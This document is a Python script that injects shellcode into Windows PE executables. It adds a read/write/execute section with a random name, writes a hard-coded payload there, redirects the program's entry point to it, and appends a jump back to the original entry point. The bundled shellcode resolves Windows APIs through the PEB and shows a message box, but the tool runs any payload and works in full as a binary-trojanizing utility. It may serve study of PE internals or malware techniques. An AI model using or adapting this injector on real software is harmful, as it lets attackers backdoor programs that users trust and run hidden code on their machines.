#!/usr/bin/python

import mmap
import os
import pefile
import struct
import sys
import string
import random

class Injector(object):
    __PE_HEADER_SECTION_STRUCT_SIZE = 40
    __SECTION_NAME_SIZE = 8
    __DWORD_SIZE = 4

    # B8 XXXXXXXX   MOV EAX, XXXXXXXX
    __MOV_EAX = "\xb8"

    # FFD0          CALL EAX
    __CALL_EAX = "\xff\xd0"

    # READ | WRITE | EXECUTE | CODE
    __SECTION_CHARACTERISTIC = 0xE0000020

    def __init__(self, new_section_name, payload):
        self.pefile = None
        self.oep = 0
        self.current_offset = 0
        self.section_name = Injector.__prepare_section_name(new_section_name)
        self.payload = payload

    @classmethod
    def from_predefined_payload(cls):
        payload = bytes(b"\xFC\x33\xD2\xB2\x30\x64\xFF\x32\x5A\x8B"
                        b"\x52\x0C\x8B\x52\x14\x8B\x72\x28\x33\xC9"
                        b"\xB1\x18\x33\xFF\x33\xC0\xAC\x3C\x61\x7C"
                        b"\x02\x2C\x20\xC1\xCF\x0D\x03\xF8\xE2\xF0"
                        b"\x81\xFF\x5B\xBC\x4A\x6A\x8B\x5A\x10\x8B"
                        b"\x12\x75\xDA\x8B\x53\x3C\x03\xD3\xFF\x72"
                        b"\x34\x8B\x52\x78\x03\xD3\x8B\x72\x20\x03"
                        b"\xF3\x33\xC9\x41\xAD\x03\xC3\x81\x38\x47"
                        b"\x65\x74\x50\x75\xF4\x81\x78\x04\x72\x6F"
                        b"\x63\x41\x75\xEB\x81\x78\x08\x64\x64\x72"
                        b"\x65\x75\xE2\x49\x8B\x72\x24\x03\xF3\x66"
                        b"\x8B\x0C\x4E\x8B\x72\x1C\x03\xF3\x8B\x14"
                        b"\x8E\x03\xD3\x52\x33\xFF\x57\x68\x61\x72"
                        b"\x79\x41\x68\x4C\x69\x62\x72\x68\x4C\x6F"
                        b"\x61\x64\x54\x53\xFF\xD2\x68\x33\x32\x01"
                        b"\x01\x66\x89\x7C\x24\x02\x68\x75\x73\x65"
                        b"\x72\x54\xFF\xD0\x68\x6F\x78\x41\x01\x8B"
                        b"\xDF\x88\x5C\x24\x03\x68\x61\x67\x65\x42"
                        b"\x68\x4D\x65\x73\x73\x54\x50\xFF\x54\x24"
                        b"\x2C\x57\x68\x4F\x5F\x6F\x21\x8B\xDC\x57"
                        b"\x53\x53\x57\xFF\xD0\x68\x65\x73\x73\x01"
                        b"\x8B\xDF\x88\x5C\x24\x03\x68\x50\x72\x6F"
                        b"\x63\x68\x45\x78\x69\x74\x54\xFF\x74\x24"
                        b"\x40\xFF\x54\x24\x40")

        section_name = "." + ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(7))

        return cls(section_name, payload)

    @staticmethod
    def __prepare_section_name(name):
        name_len = len(name)

        if name_len > Injector.__SECTION_NAME_SIZE:
            raise ValueError("Section name cannot be longer than %s bytes." % Injector.__SECTION_NAME_SIZE)

        return name + ((Injector.__SECTION_NAME_SIZE - name_len) * '\x00') if name_len < Injector.__SECTION_NAME_SIZE else name

    @staticmethod
    def __align_size(size, alignment):
        return ((size - 1) / alignment + 1) * alignment        

    def __create_new_section_header(self, last_section_offset, virtual_size, virtual_offset, raw_size, raw_offset):
        # Initialize the writer offset to end of the last section header
        self.current_offset = last_section_offset + Injector.__PE_HEADER_SECTION_STRUCT_SIZE

        self.__write_bytes_at_offset(self.section_name)
        self.__write_dword_at_offset(virtual_size)
        self.__write_dword_at_offset(virtual_offset)
        self.__write_dword_at_offset(raw_size)
        self.__write_dword_at_offset(raw_offset)
        self.__write_bytes_at_offset((12 * '\x00'))
        self.__write_dword_at_offset(Injector.__SECTION_CHARACTERISTIC)

    def __create_new_section(self, original_size, output_path):
        last_section = self.pefile.sections[self.pefile.FILE_HEADER.NumberOfSections - 1]
        file_alignment = self.pefile.OPTIONAL_HEADER.FileAlignment
        section_alignment = self.pefile.OPTIONAL_HEADER.SectionAlignment

        payload_size = len(self.payload)

        raw_offset = Injector.__align_size(last_section.PointerToRawData + last_section.SizeOfRawData, file_alignment)
        raw_size = Injector.__align_size(payload_size, file_alignment)

        virtual_offset = Injector.__align_size(last_section.VirtualAddress + last_section.Misc_VirtualSize, section_alignment)
        virtual_size = Injector.__align_size(payload_size, section_alignment)

        self.__create_new_section_header(last_section.get_file_offset(), virtual_size, virtual_offset, raw_size, raw_offset)

        # Adjust PE header
        self.pefile.FILE_HEADER.NumberOfSections += 1
        self.pefile.OPTIONAL_HEADER.SizeOfImage = virtual_size + virtual_offset

        # Resize the target and crate space for the actual payload
        self.pefile.write(output_path)
        fd = open(output_path, 'a+b')
        map = mmap.mmap(fd.fileno(), 0, access=mmap.ACCESS_WRITE)
        map.resize(original_size + len(self.payload) + 0x1000)
        map.close()
        fd.close()

    def __write_bytes_at_offset(self, data):
        self.pefile.set_bytes_at_offset(self.current_offset, data)
        self.current_offset += len(data)

    def __write_dword_at_offset(self, data):
        self.pefile.set_dword_at_offset(self.current_offset, data)
        self.current_offset += Injector.__DWORD_SIZE

    def __parse_pe_file(self, pe_file_path):
        self.pefile = pefile.PE(pe_file_path)

    def __adjust_entry_point(self, new_ep):
        self.oep = self.pefile.OPTIONAL_HEADER.AddressOfEntryPoint
        self.pefile.OPTIONAL_HEADER.AddressOfEntryPoint = new_ep

    def __prepare_payload(self):
        relative_ep = self.oep + self.pefile.OPTIONAL_HEADER.ImageBase
        branch_to_oep = Injector.__MOV_EAX + struct.pack('<Q', relative_ep)[:4] + Injector.__CALL_EAX
        self.payload += branch_to_oep

    def __inject_payload(self, output_path):
        last_section = self.pefile.sections[self.pefile.FILE_HEADER.NumberOfSections - 1]
        self.__adjust_entry_point(last_section.VirtualAddress)
        self.__prepare_payload()
        self.pefile.set_bytes_at_offset(last_section.PointerToRawData, self.payload)
        self.pefile.write(output_path)

    def inject(self, target_path, output_path):
        self.__parse_pe_file(target_path)
        self.__create_new_section(os.path.getsize(target_path), output_path)
        self.__parse_pe_file(output_path)
        self.__inject_payload(output_path)


if __name__ == '__main__':
    if len(sys.argv) < 3:
        print "Usage: pyinject.py target_exe output_exe"
    else:
        injector = Injector.from_predefined_payload()
        injector.inject(sys.argv[1], sys.argv[2])